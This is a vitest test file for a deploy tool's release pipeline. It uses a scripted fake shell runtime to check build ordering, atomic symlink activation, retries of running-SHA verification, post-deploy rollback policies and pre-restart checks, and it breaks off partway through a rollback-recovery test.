import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';
import { execSync } from 'child_process';

const require = createRequire(__filename);
const kit = require('../index.js') as typeof import('../index');
const release = require('../release.js');
const cli = require('../cli.js');
const { mergeConfig, DEFAULT_CONFIG } = kit;

const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678'; // 40 hex

// A content-aware fake execFileSync for the release pipeline. Each capture() call in
// release.js needs a plausible answer (marker, SHA, timestamp, pm2 jlist, /proc cwd,
// df, mv --version, …); everything else returns ''. `fail` forces a thrown failure
// for any command containing one of its substrings (simulates a step erroring).
function makeReleaseRuntime(over: any = {}) {
  const cfg = {
    marker: '{"layout":"releases","version":1}',
    mvVersion: 'mv (GNU coreutils) 9.1',
    dfAvail: '99999999',
    ts: '20260710T090000Z',
    sha: SHA,
    builtSha: SHA,
    canonical: '/srv/app/releases/a1b2c3d4e5f6a1b2-20260710T090000Z',
    runningSha: SHA,
    restartTime: 5,
    backupId: '/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg', // absolute path, the real shape
    releasesList: 'a1b2c3d4e5f6a1b2-20260710T090000Z\n00000000aaaa-20260709T090000Z\n00000000bbbb-20260708T090000Z',
    currentLink: 'releases/00000000aaaa-20260709T090000Z',
    previousLink: 'releases/00000000bbbb-20260708T090000Z',
    tracked: '',
    stateContent: '', // what `cat .deploy-kit-state.json` returns (interrupted-deploy guard)
    fail: [] as string[],
    ...over,
  };
  const calls: string[] = [];
  const inputs: Array<{ command: string; input: string | undefined }> = [];
  // Model PM2 stop/start so the GATED, verified writer-stop can be exercised: a
  // `pm2 stop` marks apps stopped; a start/restart brings them back online.
  const stopped = new Set<string>();
  const execFileSync = (_file: string, args: string[], options: { input?: string } = {}) => {
    const cmd = args[args.length - 1];
    calls.push(cmd);
    inputs.push({ command: cmd, input: options.input });
    if (cfg.fail.some((f: string) => cmd.includes(f))) {
      const err: any = new Error(`fake failure: ${cmd}`);
      err.stdout = '';
      throw err;
    }
    if (/pm2 stop /.test(cmd)) { if (!cfg.stopIneffective) stopped.add('app'); return ''; }
    if (/pm2 (startOrRestart|start|restart)/.test(cmd)) { stopped.clear(); return ''; }
    if (cmd.includes('cat') && cmd.includes('deploy-kit-state.json')) return cfg.stateContent;
    if (cmd.includes('.deploy-kit-layout')) return cfg.marker;
    if (cmd.includes('mv --version')) return cfg.mvVersion;
    if (cmd.includes('df -kP')) return cfg.dfAvail; // fake stands in for the awk-extracted avail column
    if (cmd.includes('date -u')) return cfg.ts;
    if (cmd.includes('rev-parse HEAD')) return cfg.builtSha;
    if (cmd.includes('rev-parse')) return cfg.sha;
    if (cmd.includes('readlink -f')) return cfg.canonical;
    if (cmd.includes('pm2 jlist')) {
      return JSON.stringify([{ name: 'app', pid: 111, pm2_env: { status: stopped.has('app') ? 'stopped' : 'online', restart_time: cfg.restartTime } }]);
    }
    if (cmd.includes('readlink ') && cmd.includes('/current')) return cfg.currentLink;
    if (cmd.includes('readlink ') && cmd.includes('/previous')) return cfg.previousLink;
    if (cmd.includes('ls -1')) return cfg.releasesList;
    if (cmd.includes('git ls-files')) return cfg.tracked;
    if (cmd.includes('get-running-sha')) return cfg.runningSha;
    if (cmd.includes('run-backup')) return cfg.backupId;
    if (cmd.includes('curl')) return '200';
    return '';
  };
  return { runtime: { execFileSync }, calls, inputs, cfg };
}

const relConfig = (over: any = {}) => mergeConfig(DEFAULT_CONFIG, {
  host: 'app@pi',
  projectDir: '/srv/app',
  appNames: ['app'],
  dbBoundApps: ['app'],
  branch: 'master',
  // Keep auto-cut out of tests that aren't exercising it -- see
  // lock.test.ts's lockConfig comment.
  autoCut: false,
  ecosystemFile: 'shared/ecosystem.config.cjs',
  health: { attempts: 2, delaySeconds: 0 },
  hooks: {
    install: 'npm ci',
    build: 'npm run build',
    backup: 'run-backup',
    migrate: 'run-migrate',
    restore: 'run-restore',
  },
  layout: {
    type: 'releases',
    keepReleases: 4,
    sharedPaths: ['.env'],
    releaseChecks: [{ name: 'prisma-client-loads', command: 'check-prisma' }],
    runningShaCommand: 'get-running-sha',
  },
  ...over,
});

const ctx = (runtime: any) => ({ runtime, sleep: () => {} });

describe('release deploy — happy path', () => {
  it('builds inside the release, then flips current atomically', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result.steps).toEqual(
      ['materialize', 'shared', 'install', 'verify-pins', 'build', 'validate', 'backup', 'migrate', 'flip', 'health', 'prune'],
    );
    expect(result.sha).toBe(SHA);
    expect(result.release).toBe('a1b2c3d4e5f6-20260710T090000Z');
    const joined = calls.join('\n');
    // AC1: install/build run INSIDE the release dir, never in current.
    expect(calls.some((cmd) => /cd \/srv\/app\/releases\/.* npm ci/.test(cmd))).toBe(true);
    expect(calls.some((cmd) => /cd \/srv\/app\/current.*npm ci/.test(cmd))).toBe(false);
    // worktree materialized detached at the resolved SHA.
    expect(joined).toContain(`worktree add --detach /srv/app/releases/a1b2c3d4e5f6-20260710T090000Z ${SHA}`);
    // Fetch MUST use an explicit refspec so a `git clone --bare` repo (no configured
    // refspec) actually updates refs/heads/* — else it builds a stale sha (SMH-116).
    expect(joined).toContain("fetch --prune 'origin' '+refs/heads/*:refs/heads/*'");
    // atomic activation via mv -Tf onto current.
    expect(calls.some((cmd) => /mv -Tf .*\/srv\/app\/current/.test(cmd))).toBe(true);
    // ordering: install → build → stop → backup → migrate → flip.
    const idx = (s: string) => calls.findIndex((cmd) => cmd.includes(s));
    expect(idx('npm ci')).toBeLessThan(idx('npm run build'));
    expect(idx('npm run build')).toBeLessThan(idx('pm2 stop app'));
    expect(idx('pm2 stop app')).toBeLessThan(idx('run-backup'));
    expect(idx('run-backup')).toBeLessThan(idx('run-migrate'));
    expect(idx('run-migrate')).toBeLessThan(calls.findIndex((cmd) => /mv -Tf .*\/current/.test(cmd)));
  });

  it('resolves the SHA from refs/heads/<branch> when origin/<branch> does not exist (bare clone)', () => {
    // `git clone --bare` maps heads->heads: origin/master does NOT resolve (rev-parse
    // echoes the literal arg), but refs/heads/master does. Deploy must still succeed.
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes("rev-parse 'origin'/'master'")) return 'origin/master'; // unresolved
        if (cmd.includes("rev-parse refs/heads/'master'")) return SHA;
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result.sha).toBe(SHA);
    expect(result.steps).toContain('flip');
  });

  it('prefers refs/heads over a STALE origin/<branch> (heads:heads fetch is authoritative)', () => {
    // If repo.git has a heads->remotes/origin refspec, origin/master is only updated by a
    // plain fetch — NOT our heads:heads fetch — so it can be stale after the remote moved.
    // refs/heads/master (force-updated by our fetch) is current and must win.
    const STALE = 'dead00000000dead00000000dead00000000dead';
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes("rev-parse 'origin'/'master'")) return STALE;       // stale remote-tracking ref
        if (cmd.includes("rev-parse refs/heads/'master'")) return SHA;      // current local head
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result.sha).toBe(SHA);       // current, NOT the stale origin sha
    expect(result.sha).not.toBe(STALE);
  });

  it('restarts from the stable ecosystem (never a baked release path) and verifies cwd', () => {
    const { runtime, calls } = makeReleaseRuntime();
    release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart /srv/app/shared/ecosystem.config.cjs'))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('readlink -f /proc/111/cwd'))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('get-running-sha'))).toBe(true);
  });

  it('runs post-deploy checks and delivery events after activation', () => {
    const { runtime, calls, inputs } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig({
      postDeployChecks: [{ name: 'public-smoke', command: 'cd current && run-smoke', onFailure: 'rollback' }],
      deliveryEvent: { command: 'cd current && emit-event' },
    }), {}, ctx(runtime));
    expect(result.steps).toContain('post-check:public-smoke');
    expect(result.steps).toContain('delivery-event');
    expect(calls.some((command) => command.includes('cd /srv/app && cd current && run-smoke'))).toBe(true);
    expect(calls.some((command) => command.includes("cd /srv/app && export DEPLOY_KIT_SHARED_DIR='/srv/app/shared'; cd current && emit-event"))).toBe(true);
    const event = JSON.parse(inputs.find(({ command }) => command.includes('emit-event'))?.input ?? '{}');
    expect(event.backupReference).toBe('smarthome-20260710T090000Z.db.gpg');
    expect(JSON.stringify(event)).not.toContain('/var/lib/smarthome/backups');
  });

  it('delivery event command carries DEPLOY_KIT_SHARED_DIR set to the resolved shared/ path', () => {
    const { runtime, calls } = makeReleaseRuntime();
    release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, ctx(runtime));
    expect(calls.some((cmd) => cmd.includes("export DEPLOY_KIT_SHARED_DIR='/srv/app/shared';") && cmd.includes('emit-event'))).toBe(true);
  });

  // Behavioural guard: a string assertion on the emitted command proves nothing
  // about whether the variable actually reaches the hook process. Real hooks are
  // COMPOUND commands whose FIRST word is `cd` (`cd current && set -a; . .env;
  // set +a; node script.js`) — `cd` is a REGULAR (non-special) shell builtin, so
  // a bare `VAR=x cmd1 && cmd2` assignment prefix only scopes VAR to cmd1 and
  // does not survive past it: verified live, `sh -c "FOO='bar' cd /tmp &&
  // node -e \"console.log(process.env.FOO)\""` prints `undefined`. (`set` is a
  // POSIX SPECIAL builtin whose prefixed assignment persists into the current
  // shell environment regardless of the export fix, so a test built around
  // `set -a` as the first command would pass even on the broken bare-assignment
  // code — verified: `sh -c "FOO='bar' set -a; true; set +a; node -e …"` prints
  // `bar` either way. Must lead with `cd`, matching real hooks, to be a real guard.)
  // This test runs the ACTUAL emitted command through a real shell, with a
  // child process at the tail of a `cd … && … ; node` chain reading the
  // variable, so it fails if the injection regresses to a bare assignment.
  it('DEPLOY_KIT_SHARED_DIR reaches a child process at the end of a real compound hook chain', () => {
    const { runtime, calls } = makeReleaseRuntime();
    release.deployRelease(relConfig({
      // Leads with `cd <dir> &&`, exactly like every real app's hook (e.g.
      // smarthome/cairn's `cd current && set -a; . .env; set +a; node …`).
      // The test's own cwd (which exists on the test machine) stands in for
      // the release's `current` symlink target.
      deliveryEvent: { command: `cd ${process.cwd()} && node -e "process.stdout.write(process.env.DEPLOY_KIT_SHARED_DIR || 'MISSING')"` },
    }), {}, ctx(runtime));
    const emitted = calls.find((cmd) => cmd.includes('DEPLOY_KIT_SHARED_DIR'));
    expect(emitted).toBeDefined();
    // `emitted` is the exact string deploy-kit hands `sh -c` on the real target
    // (already includes the `cd /srv/app && ` prefix runInDir adds); `/srv/app`
    // doesn't exist on the test machine, so swap in a real cwd for THAT `cd` too
    // -- same shell operators, same command shape, just a directory that exists.
    const shellCommand = (emitted as string).replace('cd /srv/app', `cd ${process.cwd()}`);
    const output = execSync(shellCommand, { shell: '/bin/sh', encoding: 'utf8' });
    expect(output).toBe('/srv/app/shared');
  });

  it('uses the shared db-backup JSON normalizer for release delivery events', () => {
    const backupId = JSON.stringify({
      created: {
        fullPath: '/var/lib/smarthome/backups/smarthome-20260710T090000Z.db.gpg',
        fileName: 'smarthome-20260710T090000Z.db.gpg',
      },
    });
    const { runtime, inputs } = makeReleaseRuntime({ backupId });

    release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, ctx(runtime));

    const event = JSON.parse(inputs.find(({ command }) => command.includes('emit-event'))?.input ?? '{}');
    expect(event.backupReference).toBe('smarthome-20260710T090000Z.db.gpg');
    expect(JSON.stringify(event)).not.toContain('/var/lib/smarthome/backups');
  });

  // PKG-135 Finding 7: same non-gating-but-honest treatment as deploy.js's
  // legacy pipeline (Finding 4) — a broken announcement must never fail an
  // already-verified, already-activated release, but "reported" has to mean
  // something observable: a warning plus a delivery status on the result.
  it('a successful delivery event is reflected in the result, with no warning', () => {
    const { runtime } = makeReleaseRuntime();
    const warnings: string[] = [];
    const log = { ...kit.makeLogger(() => {}, () => {}), warning: (m: string) => warnings.push(m) };
    const result = release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, { ...ctx(runtime), log });
    expect(result.deliveryEvent).toEqual({ delivered: true });
    expect(warnings.some((w) => /[Dd]elivery event/.test(w))).toBe(false);
  });

  it('a failing delivery event command warns, records delivered:false, and does NOT fail the release', () => {
    const { runtime } = makeReleaseRuntime({ fail: ['emit-event'] });
    const warnings: string[] = [];
    const log = { ...kit.makeLogger(() => {}, () => {}), warning: (m: string) => warnings.push(m) };
    const result = release.deployRelease(relConfig({ deliveryEvent: { command: 'emit-event' } }), {}, { ...ctx(runtime), log });
    expect(result.healthy).toBe(true); // non-gating: still a successful release
    expect(result.steps).toContain('delivery-event');
    expect(result.deliveryEvent).toEqual({ delivered: false });
    expect(warnings.some((w) => /[Dd]elivery event.*failed/.test(w))).toBe(true);
  });

  it('deliveryEvent is absent from the result entirely when not configured', () => {
    const { runtime } = makeReleaseRuntime();
    const result = release.deployRelease(relConfig(), {}, ctx(runtime));
    expect(result).not.toHaveProperty('deliveryEvent');
  });

  it('dispatches through the public deploy() when layout.type is releases', () => {
    const { runtime } = makeReleaseRuntime();
    const result = kit.deploy(relConfig(), {}, ctx(runtime));
    expect(result.release).toBe('a1b2c3d4e5f6-20260710T090000Z');
  });

  it('accepts a PID whose cwd is a SUBDIR of the release (real ecosystem shape)', () => {
    // smarthome-api runs with cwd <release>/packages/api, not the release root.
    const over: any = {};
    const rt = makeReleaseRuntime();
    const subdir = `${rt.cfg.canonical}/packages/api`;
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('readlink -f /proc/')) return subdir;
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    void over;
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).not.toThrow();
  });

  it('verifyActivation rejects a PID whose cwd is OUTSIDE the new release (stale process)', () => {
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('readlink -f /proc/')) return '/srv/app/releases/old1-20260709T090000Z';
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const v = release.verifyActivation(relConfig(), release.releasePaths(relConfig()), SHA, rt.cfg.canonical, ctx(runtime));
    expect(v.ok).toBe(false);
    expect(v.reason).toMatch(/not under/);
  });

  it('verifyActivation fails a crash loop (restart counts climbing across the settle window)', () => {
    let n = 0;
    const rt = makeReleaseRuntime();
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('pm2 jlist')) {
          n += 1;
          return JSON.stringify([{ name: 'app', pid: 111, pm2_env: { status: 'online', restart_time: 5 + n } }]);
        }
        return (rt.runtime.execFileSync as any)(_f, args);
      },
    };
    const v = release.verifyActivation(relConfig(), release.releasePaths(relConfig()), SHA, rt.cfg.canonical, ctx(runtime));
    expect(v.ok).toBe(false);
    expect(v.reason).toMatch(/crash loop/);
  });
});

// CAIRN-394: the running-SHA probe used to be sampled exactly ONCE after health
// came up. A restart is not instantaneous — right after `pm2 startOrRestart` the
// probe can briefly answer with the PREVIOUS release's SHA (the old worker still
// holding the port while PM2's scheduler respawns, or the app still serving
// startup state) — so the one-shot sample raced exactly the transition it
// existed to observe and rolled good deploys back. The probe is now retried
// under the SAME health attempts/delay policy, failing closed only when the
// window is exhausted.
describe('release deploy — running-SHA verification retries across a transient restart', () => {
  const OLD_SHA = 'deadbeefdeadbeefdeadbeefdeadbeefdead'; // the previous build's SHA

  // A probe that answers with the previous build's SHA for its first `staleFor`
  // observations (the transient startup/scheduler window), then with the
  // deployed SHA. Records every observation so a test can prove the sequence
  // really flapped first — otherwise a "retry succeeded" assertion is vacuous.
  // Intercepted probe calls are also pushed onto the inner runtime's `calls` so
  // command-sequence assertions still see them.
  const transientShaRuntime = (staleFor: number) => {
    const rt = makeReleaseRuntime();
    const observations: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('get-running-sha')) {
          rt.calls.push(cmd);
          const value = observations.length < staleFor ? OLD_SHA : SHA;
          observations.push(value);
          return value;
        }
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    return { runtime, observations, calls: rt.calls, canonical: rt.cfg.canonical };
  };

  it('a SHA that converges mid-window verifies; the old one-shot sample would have failed', () => {
    // New behavior: retry across the window → ok.
    const { runtime, observations, canonical } = transientShaRuntime(2);
    const cfg = relConfig({ health: { attempts: 3, delaySeconds: 0 } });
    const v = release.verifyActivation(cfg, release.releasePaths(cfg), SHA, canonical, ctx(runtime));
    expect(v.ok).toBe(true);
    // The deploy really did flap first — the retry is what saved it.
    expect(observations).toEqual([OLD_SHA, OLD_SHA, SHA]);

    // OLD behavior, demonstrated directly: the same transient sequence under a
    // one-attempt policy (exactly what the pre-CAIRN-394 single sample saw)
    // fails the verification.
    const oneShot = transientShaRuntime(2);
    const oneShotCfg = relConfig({ health: { attempts: 1, delaySeconds: 0 } });
    const v1 = release.verifyActivation(oneShotCfg, release.releasePaths(oneShotCfg), SHA, oneShot.canonical, ctx(oneShot.runtime));
    expect(v1.ok).toBe(false);
    expect(oneShot.observations).toEqual([OLD_SHA]);
  });

  it('a transient SHA flap no longer rolls a good deploy back (full pipeline)', () => {
    const { runtime, observations, calls } = transientShaRuntime(1);
    const result = release.deployRelease(relConfig({ health: { attempts: 3, delaySeconds: 0 } }), {}, ctx(runtime));
    expect(result.healthy).toBe(true);
    expect(result.steps).toContain('health');
    expect(observations).toEqual([OLD_SHA, SHA]); // the flap really happened before verification passed
    // No recovery ran: exactly the one forward restart, exactly the one forward
    // flip of `current` (a verify failure would have flipped back and resumed
    // the previous release, as the sibling mismatch tests assert).
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
    expect(calls.filter((cmd) => /mv -Tf .*\/current/.test(cmd)).length).toBe(1);
  });

  it('exhausting the retry window fails closed, naming the last observed SHA, the expected SHA, and the attempt count', () => {
    const rt = makeReleaseRuntime({ runningSha: OLD_SHA }); // never converges
    const cfg = relConfig({ health: { attempts: 3, delaySeconds: 0 } });
    const sleeps: number[] = [];
    const v = release.verifyActivation(cfg, release.releasePaths(cfg), SHA, rt.cfg.canonical, { runtime: rt.runtime, sleep: (s: number) => sleeps.push(s) });
    expect(v.ok).toBe(false);
    expect(v.reason).toContain('deadbeefdeadbeef'); // the LAST observed SHA, not a bare "mismatch"
    expect(v.reason).toContain('expected a1b2c3d4e5f6');
    expect(v.reason).toContain('after 3 attempts');
    // Bounded: the probe ran exactly `attempts` times (never an unbounded loop),
    // sleeping the health delay between attempts.
    expect(rt.calls.filter((cmd) => cmd.includes('get-running-sha')).length).toBe(3);
    expect(sleeps).toEqual([0, 0]);
  });

  it('a probe that fails outright on the final attempt names <none> as the last observation and still fails closed', () => {
    // First observation: the wrong SHA; then the probe command itself fails
    // (connection refused while the app restarts → capture() sees ''). The
    // diagnostic must name the LAST observation, not the earlier wrong one.
    const rt = makeReleaseRuntime({ runningSha: OLD_SHA });
    let probeCalls = 0;
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        if (cmd.includes('get-running-sha')) {
          probeCalls += 1;
          return probeCalls === 1 ? OLD_SHA : '';
        }
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    const cfg = relConfig({ health: { attempts: 3, delaySeconds: 0 } });
    const v = release.verifyActivation(cfg, release.releasePaths(cfg), SHA, rt.cfg.canonical, ctx(runtime));
    expect(v.ok).toBe(false);
    expect(v.reason).toContain('reports SHA <none>');
    expect(v.reason).toContain('after 3 attempts');
  });
});

describe('release deploy — post-deploy failure policy', () => {
  const failingCheck = (onFailure?: string) => ({
    name: 'public-smoke', command: 'run-smoke', ...(onFailure ? { onFailure } : {}),
  });

  it('rejects a missing policy before acquiring the deploy lock', () => {
    const { runtime, calls } = makeReleaseRuntime();
    expect(() => release.deployRelease(relConfig({ postDeployChecks: [failingCheck()] }), {}, ctx(runtime)))
      .toThrow(/onFailure/);
    expect(calls).toEqual([]);
  });

  it('rolls code and migrated data back, verifies the previous release, journals the outcome, and emits failure', () => {
    const { runtime, calls, inputs, cfg } = makeReleaseRuntime({ fail: ['run-smoke'] });
    const config = relConfig({
      postDeployChecks: [failingCheck('rollback')],
      deliveryEvent: { command: 'emit-event' },
    });

    expect(() => release.deployRelease(config, {}, ctx(runtime)))
      .toThrow(/public-smoke \(policy: rollback\)/);

    const lastIndex = (needle: string) => calls.reduce((found, command, index) => (
      command.includes(needle) ? index : found
    ), -1);
    const flipBack = calls.findIndex((command) => command.includes(`ln -s ${cfg.currentLink} /srv/app/.dk-swap.$$.current`));
    expect(lastIndex('pm2 stop')).toBeLessThan(flipBack);
    expect(flipBack).toBeLessThan(lastIndex('run-restore'));
    expect(lastIndex('run-restore')).toBeLessThan(lastIndex('pm2 startOrRestart'));

    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event).toMatchObject({
      status: 'failed', failedCheck: 'public-smoke', activeRelease: cfg.currentLink,
      recovery: { policy: 'rollback', outcome: 'rolled-back', verified: true },
    });
    expect(event.backupReference).toBe('smarthome-20260710T090000Z.db.gpg');
    expect(JSON.stringify(event)).not.toContain('/var/lib/smarthome/backups');
    expect(calls.join('\n')).toContain('post-deploy-rolled-back');
  });

  it('keeps a verified candidate active under remain-active and records a degraded event even when its sink fails', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls, inputs } = makeReleaseRuntime({ fail: ['run-smoke', 'emit-event'] });
    const warnings: string[] = [];
    const log = { ...kit.makeLogger(() => {}, () => {}), warning: (message: string) => warnings.push(message) };
    const config = relConfig({
      postDeployChecks: [failingCheck('remain-active')],
      deliveryEvent: { command: 'emit-event' },
    });

    expect(() => release.deployRelease(config, {}, { ...ctx(runtime), log }))
      .toThrow(/policy: remain-active/);
    expect(calls.some((command) => command.includes(`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`))).toBe(false);
    expect(calls.some((command) => command.includes('run-restore'))).toBe(false);
    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event).toMatchObject({
      status: 'degraded', failedCheck: 'public-smoke', activeRevision: SHA,
      recovery: { policy: 'remain-active', outcome: 'remained-active', verified: true },
    });
    expect(calls.join('\n')).toContain('post-deploy-degraded');
    expect(warnings.some((message) => /on-host release journal/.test(message))).toBe(true);
  });

  it('records manual-decision-required without mutating code or data', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls, inputs } = makeReleaseRuntime({ fail: ['run-smoke'] });
    const config = relConfig({
      postDeployChecks: [failingCheck('manual')],
      deliveryEvent: { command: 'emit-event' },
    });
    expect(() => release.deployRelease(config, {}, ctx(runtime))).toThrow(/policy: manual/);
    expect(calls.some((command) => command.includes(`ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`))).toBe(false);
    expect(calls.some((command) => command.includes('run-restore'))).toBe(false);
    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event.recovery).toEqual({ policy: 'manual', outcome: 'manual-decision-required', verified: true });
    expect(calls.join('\n')).toContain('post-deploy-manual-decision');
  });

  it('journals and emits rollback-failed when the recovery pointer cannot be restored', () => {
    const probe = makeReleaseRuntime();
    const { runtime, calls, inputs } = makeReleaseRuntime({
      fail: ['run-smoke', `ln -s ${probe.cfg.currentLink} /srv/app/.dk-swap.$$.current`],
    });
    const config = relConfig({
      postDeployChecks: [failingCheck('rollback')],
      deliveryEvent: { command: 'emit-event' },
    });
    expect(() => release.deployRelease(config, {}, ctx(runtime))).toThrow(/MANUAL RECOVERY REQUIRED/);
    expect(calls.join('\n')).toContain('post-deploy-rollback-failed');
    const event = JSON.parse(inputs.filter(({ command }) => command.includes('emit-event')).at(-1)?.input ?? '{}');
    expect(event.recovery).toEqual({ policy: 'rollback', outcome: 'rollback-failed', verified: false });
    expect(calls.filter((command) => command.includes('pm2 startOrRestart')).length).toBe(1);
  });

  it('refuses a new deploy after interruption during post-check rollback', () => {
    const { runtime, calls } = makeReleaseRuntime({
      stateContent: '{"phase":"post-deploy-rollback","releaseId":"a1b2c3d4e5f6-20260710T010000Z"}',
    });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/interrupted mid-"post-deploy-rollback"/);
    expect(calls.some((command) => command.includes('worktree add'))).toBe(false);
  });
});

describe('release deploy — preRestartChecks', () => {
  it('runs IMMEDIATELY BEFORE the pm2 restart, after the current flip', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const cfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    const result = release.deployRelease(cfg, {}, ctx(runtime));
    expect(result.steps).toContain('pre-restart-check:port-safe');
    const flip = calls.findIndex((cmd) => /mv -Tf .*\/current/.test(cmd));
    const check = calls.findIndex((cmd) => cmd.includes('check-port'));
    const restart = calls.findIndex((cmd) => cmd.includes('pm2 startOrRestart'));
    expect(flip).toBeLessThan(check);
    expect(check).toBeLessThan(restart);
  });

  it('a failing preRestartCheck runs the flipped-phase recovery (flips current back)', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['check-port'] });
    const cfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    expect(() => release.deployRelease(cfg, {}, ctx(runtime))).toThrow();
    // The check fails BEFORE the forward pm2 restart, so the only
    // `pm2 startOrRestart` seen is recovery's resume of the PREVIOUS release.
    expect(calls.filter((cmd) => cmd.includes('pm2 startOrRestart')).length).toBe(1);
    // two mv -Tf onto current: forward flip + recovery flip-back.
    expect(calls.filter((cmd) => /mv -Tf .*\/current/.test(cmd)).length).toBeGreaterThanOrEqual(2);
  });

  it('absent preRestartChecks is a strict no-op on the release path too', () => {
    const { runtime: r1, calls: c1 } = makeReleaseRuntime();
    release.deployRelease(relConfig(), {}, ctx(r1));
    const { runtime: r2, calls: c2 } = makeReleaseRuntime();
    release.deployRelease(relConfig({ preRestartChecks: [] }), {}, ctx(r2));
    expect(c2).toEqual(c1);
  });

  it('also gates release rollback, immediately before its restart', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const cfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });
    release.rollbackRelease(cfg, {}, ctx(runtime));
    const check = calls.findIndex((cmd) => cmd.includes('check-port'));
    const restart = calls.findIndex((cmd) => cmd.includes('pm2 startOrRestart'));
    expect(check).toBeGreaterThanOrEqual(0);
    expect(check).toBeLessThan(restart);
  });
});

describe('release deploy — preMigrationChecks', () => {
  it('runs after candidate validation and before writers stop', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const cfg = relConfig({
      preMigrationChecks: [{ name: 'schema-rehearsal', command: 'run-rehearsal' }],
    });
    const result = release.deployRelease(cfg, {}, ctx(runtime));
    expect(result.steps).toContain('pre-migration-check:schema-rehearsal');
    const validate = calls.findIndex((command) => command.includes('check-prisma'));
    const rehearsal = calls.findIndex((command) => command.includes('run-rehearsal'));
    const stop = calls.findIndex((command) => command.includes('pm2 stop app'));
    expect(validate).toBeLessThan(rehearsal);
    expect(rehearsal).toBeLessThan(stop);
  });

  it('a failed rehearsal aborts with writers still online and no live backup', () => {
    const { runtime, calls } = makeReleaseRuntime({ fail: ['run-rehearsal'] });
    const cfg = relConfig({
      preMigrationChecks: [{ name: 'schema-rehearsal', command: 'run-rehearsal' }],
    });
    expect(() => release.deployRelease(cfg, {}, ctx(runtime))).toThrow(/run-rehearsal/);
    expect(calls.some((command) => command.includes('pm2 stop app'))).toBe(false);
    expect(calls.some((command) => command.includes('run-backup'))).toBe(false);
  });

  it('skips rehearsal with --skip-migrate', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const cfg = relConfig({
      preMigrationChecks: [{ name: 'schema-rehearsal', command: 'run-rehearsal' }],
    });
    release.deployRelease(cfg, { skipMigrate: true }, ctx(runtime));
    expect(calls.some((command) => command.includes('run-rehearsal'))).toBe(false);
  });
});

// PKG-135 Finding 5: `current` is flipped to the rollback target BEFORE
// preRestartChecks run. Before this fix, a failing check threw straight out
// of rollbackRelease() -- `current` was left pointing at the (unrestarted)
// rollback target while the ORIGINAL process, never restarted, was still
// what was actually serving traffic. The symlink and the running process
// disagreed, which is the worst state to be in mid-incident.
describe('release rollback — post-flip recovery (PKG-135 Finding 5)', () => {
  it('a failing preRestartCheck restores originalCurrent, leaving the symlink consistent with the running process', () => {
    const { runtime, calls, cfg } = makeReleaseRuntime({ fail: ['check-port'] });
    const rbCfg = relConfig({ preRestartChecks: [{ name: 'port-safe', command: 'check-port' }] });

    expect(() => release.rollbackRelease(rbCfg, {}, ctx(runtime)))
      .toThrow(/restored the original release/);

    // Assert the actual symlink target the recovery left behind, not just
    // that it threw: the LAST `ln -s` onto current must point at
    // originalCurrent (cfg.currentLink — what was live before this rollback
    // ever ran), not at the failed rollback target (cfg.previousLink).
    const flipsToPrevious = calls.filter((cmd) => cmd.includes(`ln -s ${cfg.previousLink} `));
    const flipsToOriginal = calls.filter((cmd) => cmd.includes(`ln -s ${cfg.currentLink} `));
    expect(flipsToPrevious.length).toBe(1); // the forward flip, before the check ran
    expect(flipsToOriginal.length).toBe(1); // the recovery flip-back
    const forwardFlipIdx = calls.findIndex((cmd) => cmd.includes(`ln -s ${cfg.previousLink} `));
